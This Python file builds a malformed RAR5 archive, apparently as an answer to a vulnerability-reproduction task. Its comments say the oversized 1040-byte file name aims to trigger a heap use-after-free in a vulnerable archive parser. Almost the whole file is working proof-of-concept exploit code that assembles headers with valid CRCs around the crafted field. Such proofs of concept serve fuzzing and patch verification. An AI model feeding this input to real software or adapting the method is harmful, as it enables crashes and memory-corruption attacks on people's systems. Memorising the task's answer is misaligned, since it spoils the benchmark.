import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def to_vint(val):
            out = bytearray()
            while True:
                byte = val & 0x7F
                val >>= 7
                if val > 0:
                    byte |= 0x80
                    out.append(byte)
                else:
                    out.append(byte)
                    break
            return bytes(out)

        # RAR5 Signature: Rar!\x1a\x07\x01\x00
        sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"

        # --- Main Header (Type 1) ---
        # Minimal main header
        mh_type = to_vint(1)
        mh_flags = to_vint(0)
        mh_arch_flags = to_vint(0) 
        
        mh_content = mh_type + mh_flags + mh_arch_flags
        mh_size = to_vint(len(mh_content))
        
        # Header CRC is calculated over Size + Content (Type + Flags + ...)
        mh_crc_data = mh_size + mh_content
        mh_crc = zlib.crc32(mh_crc_data) & 0xFFFFFFFF
        mh_block = struct.pack("<I", mh_crc) + mh_crc_data

        # --- File Header (Type 2) ---
        # Vulnerability triggers when name size is read, then name is read, then size checked.
        # We provide a name length of 1040 bytes which is likely sufficient to trigger the
        # "excessive size" check after allocation/reading in the vulnerable version,
        # leading to the Heap Use After Free condition during error handling/cleanup.
        name_len = 1040
        name = b"A" * name_len
        
        fh_type = to_vint(2)
        fh_flags = to_vint(0)
        
        # File specific fields
        fh_file_flags = to_vint(0x04) # 0x04 indicates DataCRC is present
        fh_unpack_size = to_vint(0)
        fh_attributes = to_vint(0)
        fh_datacrc = b"\x00\x00\x00\x00"
        fh_compression = to_vint(0) # Stored
        fh_host_os = to_vint(0)
        fh_namelen = to_vint(name_len)
        
        fh_payload = (fh_file_flags + fh_unpack_size + fh_attributes + 
                      fh_datacrc + fh_compression + fh_host_os + 
                      fh_namelen + name)
        
        fh_content = fh_type + fh_flags + fh_payload
        fh_size = to_vint(len(fh_content))
        
        fh_crc_data = fh_size + fh_content
        fh_crc = zlib.crc32(fh_crc_data) & 0xFFFFFFFF
        fh_block = struct.pack("<I", fh_crc) + fh_crc_data

        # --- End of Archive (Type 5) ---
        eo_type = to_vint(5)
        eo_flags = to_vint(0)
        
        eo_content = eo_type + eo_flags
        eo_size = to_vint(len(eo_content))
        
        eo_crc_data = eo_size + eo_content
        eo_crc = zlib.crc32(eo_crc_data) & 0xFFFFFFFF
        eo_block = struct.pack("<I", eo_crc) + eo_crc_data

        return sig + mh_block + fh_block + eo_block
